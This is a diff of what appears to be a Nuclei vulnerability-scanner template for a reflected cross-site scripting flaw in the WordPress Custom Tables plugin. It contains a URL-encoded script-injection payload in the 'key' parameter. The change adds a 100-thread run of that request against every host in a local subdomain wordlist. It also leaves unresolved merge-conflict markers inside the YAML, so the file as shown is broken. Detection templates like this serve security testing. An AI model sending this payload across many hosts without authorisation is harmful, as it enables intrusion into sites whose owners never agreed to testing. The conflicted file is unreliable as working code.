@@ -1,6 +1,7 @@
 id: wp-custom-tables-xss
 
 info:
+<<<<<<< HEAD
   name: WordPress Custom Tables 3.4.4 - Cross-Site Scripting
   author: daffainfo
   severity: high
@@ -13,12 +14,28 @@ info:
     cvss-score: 7.2
     cwe-id: CWE-79
   tags: wpscan,wordpress,xss,wp-plugin
+=======
+  name: WordPress Custom Tables Plugin 3.4.4 - Reflected Cross Site Scripting (XSS)
+  author: daffainfo
+  severity: medium
+  description: WordPress custom tables Plugin 'key' Parameter Cross Site Scripting Vulnerability
+  reference: https://www.securityfocus.com/bid/54326/info
+  tags: wordpress,xss,wp-plugin
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
-  - method: GET
-    path:
-      - '{{BaseURL}}/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
     matchers-condition: and
     matchers:
       - type: word
